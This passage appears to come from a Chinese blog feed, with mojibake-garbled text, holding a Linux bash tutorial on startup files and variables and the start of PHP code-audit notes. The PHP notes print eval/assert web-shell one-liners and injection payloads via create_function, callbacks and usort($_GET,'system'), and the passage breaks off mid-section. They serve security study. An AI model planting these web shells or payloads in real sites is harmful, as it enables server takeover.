ä¸ªæ–‡ä»¶ä¸­æŸ¥æ‰¾å‘½ä»¤ã€‚</p><p>è¿™äº›æ–‡ä»¶å«ä½œå¯åŠ¨æ–‡ä»¶æˆ–ç¯å¢ƒæ–‡ä»¶ã€‚</p></blockquote></li><li><p>5ä¸ªä¸åŒçš„å¯åŠ¨æ–‡ä»¶</p><p>ï± &#x2F;etc&#x2F;profile </p><p>ï± $HOME&#x2F;.bash_profile </p><p>ï± $HOME&#x2F;.bashrc </p><p>ï± $HOME&#x2F;.bash_login </p><p>ï± $HOME&#x2F;.profile </p></li><li><p>&#x2F;etc&#x2F;profileæ–‡ä»¶</p><blockquote><p>&#x2F;etc&#x2F;profileæ–‡ä»¶æ˜¯bash shellé»˜è®¤çš„çš„ä¸»å¯åŠ¨æ–‡ä»¶ã€‚</p><p>åªè¦ä½ ç™»å½•äº†Linuxç³»ç»Ÿï¼Œbashå°±ä¼šæ‰§è¡Œ&#x2F;etc&#x2F;profileå¯åŠ¨æ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat /etc/profile</span><br><span class="line">.....</span><br><span class="line">.....</span><br><span class="line">for i in /etc/profile.d/*.sh ; do</span><br><span class="line">    if [ -r &quot;$i&quot; ]; then</span><br><span class="line">        if [ &quot;$&#123;-#*i&#125;&quot; != &quot;$-&quot; ]; then </span><br><span class="line">            . &quot;$i&quot;</span><br><span class="line">        else</span><br><span class="line">            . &quot;$i&quot; &gt;/dev/null</span><br><span class="line">        fi</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line">....</span><br><span class="line">....</span><br></pre></td></tr></table></figure><blockquote><p>å…¶ä¸­çš„forè¯­å¥ä¸ºLinuxç³»ç»Ÿæä¾›äº†ä¸€ä¸ªæ”¾ç½®ç‰¹å®šåº”ç”¨ç¨‹åºå¯åŠ¨æ–‡ä»¶çš„åœ°æ–¹ï¼Œå½“ç”¨æˆ·ç™»å½•æ—¶ï¼Œshellä¼šæ‰§è¡Œè¿™äº›æ–‡ä»¶ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls -al /etc/profile.d/</span><br><span class="line">total 64</span><br><span class="line">drwxr-xr-x.  2 root root 4096 Oct 15  2017 .</span><br><span class="line">drwxr-xr-x. 82 root root 4096 Sep 24 23:07 ..</span><br><span class="line">-rw-r--r--.  1 root root  123 Jul 31  2015 less.csh</span><br><span class="line">-rw-r--r--.  1 root root  121 Jul 31  2015 less.sh</span><br><span class="line">-rw-r--r--   1 root root  105 Aug  2  2017 vim.csh</span><br><span class="line">-rw-r--r--   1 root root  269 Aug  2  2017 vim.sh</span><br><span class="line">-rw-r--r--.  1 root root  164 Jan 28  2014 which2.csh</span><br><span class="line">-rw-r--r--.  1 root root  169 Jan 28  2014 which2.sh</span><br><span class="line">-rw-r--r--. 1 root root 1741 Feb 20 05:44 lang.csh </span><br><span class="line">-rw-r--r--. 1 root root 2706 Feb 20 05:44 lang.sh</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><blockquote><p>ä¸éš¾å‘ç°ï¼Œæœ‰äº›æ–‡ä»¶ä¸ç³»ç»Ÿä¸­çš„ç‰¹å®šåº”ç”¨æœ‰å…³ã€‚</p><p>å¤§éƒ¨åˆ†åº”ç”¨éƒ½ä¼šåˆ›å»ºä¸¤ä¸ªå¯åŠ¨æ–‡ä»¶ï¼šä¸€ä¸ªä¾›bash shellä½¿ç”¨ï¼ˆä½¿ç”¨.shæ‰©å±•åï¼‰ï¼Œä¸€ä¸ªä¾›c shellä½¿ç”¨ï¼ˆä½¿ç”¨.cshæ‰©å±•åï¼‰ã€‚</p><p>å…¶ä¸­lang.cshå’Œlang.shæ–‡ä»¶æ˜¯ç”¨æ¥è®¾ç½®å­—ç¬¦é›†çš„ã€‚</p></blockquote></li><li><p>$HOMEç›®å½•ä¸‹çš„å¯åŠ¨æ–‡ä»¶</p><blockquote><p>è¿™äº›å¯åŠ¨æ–‡ä»¶éƒ½èµ·ç€åŒä¸€ä¸ªä½œç”¨ï¼šæä¾›ä¸€ä¸ªç”¨æˆ·ä¸“å±çš„å¯åŠ¨æ–‡ä»¶æ¥å®šä¹‰è¯¥ç”¨æˆ·æ‰€ç”¨åˆ°çš„ç¯</p><p>å¢ƒå˜é‡ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls -a $HOME</span><br><span class="line">.  ..  .bash_history  .bash_logout  .bash_profile  .bashrc  .cache  cqhttp  .cshrc  H1ve  my_cmd  .pip  .pki  .pydistutils.cfg  .ssh  .tcshrc  .viminfo  .viminfo.tmp  web</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat $HOME/.bash_profile</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">.bash_profile</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Get the aliases and <span class="built_in">functions</span></span></span><br><span class="line">if [ -f ~/.bashrc ]; then</span><br><span class="line">. ~/.bashrc</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">User specific environment and startup programs</span></span><br><span class="line"></span><br><span class="line">PATH=$PATH:$HOME/bin</span><br><span class="line"></span><br><span class="line">export PATH</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>è¿™é‡Œå…ˆä¼šåˆ¤æ–­.bashrcæ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨å…ˆæ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat .bashrc </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">.bashrc</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">User specific aliases and <span class="built_in">functions</span></span></span><br><span class="line"></span><br><span class="line">alias rm=&#x27;rm -i&#x27;</span><br><span class="line">alias cp=&#x27;cp -i&#x27;</span><br><span class="line">alias mv=&#x27;mv -i&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Source global definitions</span></span><br><span class="line">if [ -f /etc/bashrc ]; then</span><br><span class="line">. /etc/bashrc</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥è®¾ç½®åˆ«åï¼Œæ¯”å¦‚æˆ‘æ·»åŠ <code>alias la=&#39;ls -a&#39;</code>,é‡å¯shellå</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat ~/.bashrc </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">.bashrc</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">User specific aliases and <span class="built_in">functions</span></span></span><br><span class="line"></span><br><span class="line">alias rm=&#x27;rm -i&#x27;</span><br><span class="line">alias cp=&#x27;cp -i&#x27;</span><br><span class="line">alias mv=&#x27;mv -i&#x27;</span><br><span class="line">alias la=&#x27;ls -a&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Source global definitions</span></span><br><span class="line">if [ -f /etc/bashrc ]; then</span><br><span class="line">. /etc/bashrc</span><br><span class="line">fi</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# la</span><br><span class="line">.  ..  .bash_history  .bash_logout  .bash_profile  .bashrc  .cache  cqhttp  .cshrc  H1ve  my_cmd  .pip  .pki  .pydistutils.cfg  .ssh  .tcshrc  .viminfo  .viminfo.tmp  web</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><code>PATH=$PATH:$HOME/bin</code>åˆ™åº”è¯¥æ˜¯ç™»å½•shellåè‡ªåŠ¨æ·»åŠ è·¯å¾„åˆ°PATHä¸­</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ç¼–è¾‘ä¸ºPATH=$PATH:$HOME/bin:$HOME/my_cmd</span><br><span class="line">é‡å¯shellå/sourceç«‹å³ç”Ÿæ•ˆå</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin:/root/my_cmd</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# hello</span><br><span class="line">hello khaz</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="ç¯å¢ƒå˜é‡ç«‹å³ç”Ÿæ•ˆ"><a href="#ç¯å¢ƒå˜é‡ç«‹å³ç”Ÿæ•ˆ" class="headerlink" title="ç¯å¢ƒå˜é‡ç«‹å³ç”Ÿæ•ˆ"></a>ç¯å¢ƒå˜é‡ç«‹å³ç”Ÿæ•ˆ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source xxx</span><br></pre></td></tr></table></figure><h3 id="ç¯å¢ƒå˜é‡ç‰¹æ€§"><a href="#ç¯å¢ƒå˜é‡ç‰¹æ€§" class="headerlink" title="ç¯å¢ƒå˜é‡ç‰¹æ€§"></a>ç¯å¢ƒå˜é‡ç‰¹æ€§</h3><blockquote><p>ç¯å¢ƒå˜é‡æœ‰ä¸€ä¸ªå¾ˆé…·çš„ç‰¹æ€§å°±æ˜¯ï¼Œå®ƒä»¬å¯ä½œä¸ºæ•°ç»„ä½¿ç”¨ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# arrary=(1 2 3)</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $arrary</span><br><span class="line">1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $arrary[1]</span><br><span class="line">1[1]</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $&#123;arrary[1]&#125;</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>åœ¨ä½¿ç”¨å˜é‡æ—¶æœ€å¥½å°†å˜é‡åç”¨{}æ‹¬èµ·æ¥ï¼Œå¦åˆ™å¯èƒ½ä¼šè§£æé”™è¯¯ã€‚</p><h1 id="shellè„šæœ¬ç¼–å†™"><a href="#shellè„šæœ¬ç¼–å†™" class="headerlink" title="shellè„šæœ¬ç¼–å†™"></a>shellè„šæœ¬ç¼–å†™</h1><ol><li><p>åˆ›å»ºshellè„šæœ¬</p><blockquote><p>åœ¨åˆ›å»ºshellè„šæœ¬æ–‡ä»¶æ—¶ï¼Œå¿…é¡»åœ¨æ–‡ä»¶çš„ç¬¬ä¸€è¡ŒæŒ‡å®šè¦ä½¿ç”¨çš„shellã€‚å…¶æ ¼å¼ä¸ºï¼š<code>#!/bin/bash </code></p><p>åœ¨é€šå¸¸çš„shellè„šæœ¬ä¸­ï¼Œäº•å·ï¼ˆ#ï¼‰ç”¨ä½œæ³¨é‡Šè¡Œã€‚shellå¹¶ä¸ä¼šå¤„ç†shellè„šæœ¬ä¸­çš„æ³¨é‡Šè¡Œã€‚ç„¶è€Œï¼Œ</p><p>shellè„šæœ¬æ–‡ä»¶çš„ç¬¬ä¸€è¡Œæ˜¯ä¸ªä¾‹å¤–ï¼Œ#åé¢çš„æƒŠå¹å·ä¼šå‘Šè¯‰shellç”¨å“ªä¸ªshellæ¥è¿è¡Œè„šæœ¬ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo hello world</span><br></pre></td></tr></table></figure></li><li><p>è®¾ç½®æƒé™</p><p><code>sudo chmod +x file_name </code></p></li><li><p>è¿è¡Œè„šæœ¬</p><ul><li>shell è„šæœ¬æ–‡ä»¶å</li><li>chmod +x è„šæœ¬æ–‡ä»¶å; è„šæœ¬æ–‡ä»¶å</li><li>. è„šæœ¬æ–‡ä»¶å</li><li>source è„šæœ¬æ–‡ä»¶å</li></ul></li></ol><p>è„šæœ¬æ–‡ä»¶åå¦‚<code>./name.sh</code></p><img src="E:\typora img\20210321121053755.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" style="zoom: 80%;" /><h3 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h3><h4 id="å®šä¹‰ä¸ä½¿ç”¨"><a href="#å®šä¹‰ä¸ä½¿ç”¨" class="headerlink" title="å®šä¹‰ä¸ä½¿ç”¨"></a>å®šä¹‰ä¸ä½¿ç”¨</h4><blockquote><p>å¦‚æœè¦ç”¨åˆ°å˜é‡ï¼Œä½¿ç”¨$ï¼›</p><p>å¦‚æœè¦æ“ä½œå˜é‡ï¼Œä¸ä½¿ç”¨$ã€‚</p><p>è¿™æ¡è§„åˆ™çš„ä¸€ä¸ªä¾‹å¤–å°±æ˜¯ä½¿ç”¨printenvæ˜¾ç¤ºæŸä¸ªå˜é‡çš„å€¼ã€‚</p></blockquote><p>ç”¨åˆ°å˜é‡ â†’ ç”¨åˆ°å˜é‡çš„å€¼</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $a  #è¾“å‡ºå˜é‡çš„å€¼</span><br><span class="line">printenv PATH #ç”¨åˆ°å˜é‡çš„å€¼ï¼Œä½†ä¸éœ€è¦åŠ $</span><br></pre></td></tr></table></figure><p>æ“ä½œå˜é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a=1 #å®šä¹‰å˜é‡</span><br><span class="line">export a #å¯¼å‡ºå˜é‡</span><br><span class="line">unset a #åˆ é™¤å˜é‡</span><br></pre></td></tr></table></figure><h4 id="ç‰¹æ€§"><a href="#ç‰¹æ€§" class="headerlink" title="ç‰¹æ€§"></a>ç‰¹æ€§</h4><p>èƒ½å¤Ÿè®©å˜é‡ä½œä¸ºå‘½ä»¤è¡Œå‚æ•°</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME</span><br><span class="line">/root</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls $HOME</span><br><span class="line">H1ve  web</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls /root</span><br><span class="line">H1ve  web</span><br></pre></td></tr></table></figure><p>å†…æ•›æ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat `ls`</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat $(ls)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;è¯»å–å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line">å°†lsçš„è¾“å‡ºä½œä¸ºcatçš„è¾“å…¥è¿›è¡Œæ‰§è¡Œã€‚</span><br></pre></td></tr></table></figure><blockquote><p>å…ˆæ‰§è¡Œçš„å‘½ä»¤æ˜¯ç”±å½“å‰shellåˆ›å»ºçš„å­shellæ‰§è¡Œçš„ã€‚</p></blockquote><p>åŠ ä¸Š{}ç”¨äºåŒºåˆ†å˜é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# a=b</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $ab</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">å› ä¸ºæ‰¾ä¸åˆ°å˜é‡abï¼Œæ‰€ä»¥è¾“å‡ºä¸ºç©º</span></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $&#123;a&#125;b</span><br><span class="line">bb</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦ä¸²"><a href="#å­—ç¬¦ä¸²" class="headerlink" title="å­—ç¬¦ä¸²"></a>å­—ç¬¦ä¸²</h3><p>å½“å˜é‡å€¼å«æœ‰ç©ºæ ¼æ—¶ï¼Œå°±è¦åŠ ä¸Šå¼•å·ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# b= world</span><br><span class="line">-bash: world: command not found</span><br></pre></td></tr></table></figure><p>å•å¼•å·ï¼šä¸èƒ½è§£æå˜é‡ï¼Œåªä¼šåŸæ ·è¾“å‡º</p><p>åŒå¼•å·ï¼šèƒ½å¤Ÿè§£æå˜é‡</p><ul><li>è·å–å­—ç¬¦ä¸²é•¿åº¦   &#96;$</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPä»£ç å®¡è®¡åŸºç¡€</title>
      <link href="/2023/05/31/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/05/31/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»£ç æ‰§è¡Œå‡½æ•°"><a href="#ä»£ç æ‰§è¡Œå‡½æ•°" class="headerlink" title="ä»£ç æ‰§è¡Œå‡½æ•°"></a>ä»£ç æ‰§è¡Œå‡½æ•°</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><p><code>&lt;?php eval(&quot;$_POST[1]&quot;)?&gt;</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;payload&#x27;</span>);</span><br></pre></td></tr></table></figure><p>éœ€è¦åœ¨è¯­å¥æœ«åŠ ä¸Šï¼›</p><h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h2><p><code>&lt;?php assert(&quot;$_POST[1]&quot;)?&gt;</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;payload&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ä¸éœ€è¦åœ¨è¯­å¥æœ«åŠ ä¸Šï¼›</p><h2 id="evalå’ŒassertäºŒè€…åŒºåˆ«â€“æ³¨æ„"><a href="#evalå’ŒassertäºŒè€…åŒºåˆ«â€“æ³¨æ„" class="headerlink" title="evalå’ŒassertäºŒè€…åŒºåˆ«â€“æ³¨æ„"></a>evalå’ŒassertäºŒè€…åŒºåˆ«â€“æ³¨æ„</h2><p>php5ä¸­assertæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>$f=&#39;assert&#39;;$f(...);</code>è¿™æ ·çš„æ–¹æ³•æ¥åŠ¨æ€æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><p>ä½†php7ä¸­ï¼Œ<code>assert</code>ä¸å†æ˜¯å‡½æ•°ï¼Œå˜æˆäº†ä¸€ä¸ªè¯­è¨€ç»“æ„ï¼ˆç±»ä¼¼<code>eval</code>ï¼‰ï¼Œä¸èƒ½å†ä½œä¸ºå‡½æ•°ååŠ¨æ€æ‰§è¡Œä»£ç </p><h2 id="preg-replaceçš„-x2F-eæ¨¡å¼"><a href="#preg-replaceçš„-x2F-eæ¨¡å¼" class="headerlink" title="preg_replaceçš„&#x2F;eæ¨¡å¼"></a>preg_replaceçš„&#x2F;eæ¨¡å¼</h2><p>phpç‰ˆæœ¬&lt;5.5</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/pattern/e&#x27;</span>,<span class="variable">$command</span>,<span class="variable">$value</span> );</span><br></pre></td></tr></table></figure><p>åœ¨&#x2F;eæ¨¡å¼ä¸‹ï¼Œå¦‚æœæ­£åˆ™åŒ¹é…æˆåŠŸï¼Œå°±ä¼šå‘½ä»¤æ‰§è¡Œpreg_replace()çš„ç¬¬äºŒä¸ªå‚æ•°</p><h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h2><p><strong>PHP 7.2.0 èµ·è¢«<em>åºŸå¼ƒ</em>ï¼Œå¹¶è‡ª PHP 8.0.0 èµ·è¢«<em>ç§»é™¤</em></strong></p><blockquote><p>æ­¤å‡½æ•°åœ¨å†…éƒ¨æ‰§è¡Œ <a href="https://www.php.net/manual/zh/function.eval.php">eval()</a>ï¼Œå› æ­¤å…·æœ‰è·Ÿ <a href="https://www.php.net/manual/zh/function.eval.php">eval()</a> ç›¸åŒçš„å®‰å…¨é—®é¢˜ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">ç­‰ä»·äº</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">       <span class="variable">$b</span>;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>å½“<code>$b=1;&#125;phpinfo();/*</code>æ—¶</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">       <span class="number">1</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*</span></span><br><span class="line"><span class="comment">&#125;  </span></span><br></pre></td></tr></table></figure><p>æ•´ç†ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"> <span class="comment">/*&#125;  </span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œäº†phpinfo()</p><h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cmd</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;cmd&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="comment"># ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå›è°ƒå‡½æ•°,å…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>call_user_func_array()ï¼Œç¬¬äºŒä¸ªå‚æ•°è¦ä¸ºæ•°ç»„</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cmd</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;cmd&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = [<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="comment"># ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå›è°ƒå‡½æ•°,å…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$func</span>, <span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><h2 id="å˜é‡å‡½æ•°"><a href="#å˜é‡å‡½æ•°" class="headerlink" title="å˜é‡å‡½æ•°"></a>å˜é‡å‡½æ•°</h2><p><strong>PHP&lt;7</strong></p><p>å¦‚æœåœ¨ä¸€ä¸ªå˜é‡åé¢åŠ ä¸Šä¸€å¯¹æ‹¬å·ï¼Œé‚£ä¹ˆè§£é‡Šå™¨ä¼šè¯•å›¾å¯»æ‰¾åå­—å’Œè¿™ä¸ªå˜é‡çš„å€¼ä¸€æ ·çš„ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœæ‰¾åˆ°äº†å°±æ‰§è¡Œå®ƒã€‚</p><p>æ‰€ä»¥phpä¸­å¯ä»¥æŠŠå‡½æ•°åé€šè¿‡å­—ç¬¦ä¸²çš„æ–¹å¼ä¼ é€’ç»™ä¸€ä¸ªå˜é‡ï¼Œç„¶åé€šè¿‡æ­¤å˜é‡åŠ¨æ€è°ƒç”¨å‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;system(&#x27;whoami&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="æ•°ç»„å‡½æ•°"><a href="#æ•°ç»„å‡½æ•°" class="headerlink" title="æ•°ç»„å‡½æ•°"></a>æ•°ç»„å‡½æ•°</h2><h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cmd</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;cmd&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = [<span class="string">&#x27;whoami&#x27;</span>,<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="comment"># ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå›è°ƒå‡½æ•°ï¼Œç¬¬äºŒä¸ªä¸ºä¼ å…¥çš„å‚æ•°æ•°ç»„</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>, <span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>ç›¸å½“äºæ‰§è¡Œäº†ä¸¤æ¬¡whoamiå‘½ä»¤</p><h3 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter"></a>array_filter</h3><p>å‚æ•°ä½ç½®æ¢äº†ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cmd</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;cmd&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = [<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="comment"># ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºä¼ å…¥çš„å‚æ•°æ•°ç»„,ç¬¬äºŒä¸ªå‚æ•°ä¸ºå›è°ƒå‡½æ•°</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">array_filter</span>(<span class="variable">$cmd</span>, <span class="variable">$func</span>);</span><br></pre></td></tr></table></figure><h3 id="usortã€uasort"><a href="#usortã€uasort" class="headerlink" title="usortã€uasort"></a>usortã€uasort</h3><p>PHP&lt;7</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">usort</span>(<span class="variable">$_GET</span>,<span class="string">&#x27;system&#x27;</span>);    <span class="comment">//xxx.php?1=1&amp;2=whoami</span></span><br><span class="line"><span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);  <span class="comment">//xxx.php?1[]=test&amp;1[]=phpinfo();&amp;2=assert</span></span><br></pre></td></tr></table></figure><h1 id="å‘½ä»¤æ‰§è¡Œå‡½æ•°"><a href="#å‘½ä»¤æ‰§è¡Œå‡½æ•°" class="headerlink" title="å‘½ä»¤æ‰§è¡Œå‡½æ•°"></a>å‘½ä»¤æ‰§è¡Œå‡½æ•°</h1><h2 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span 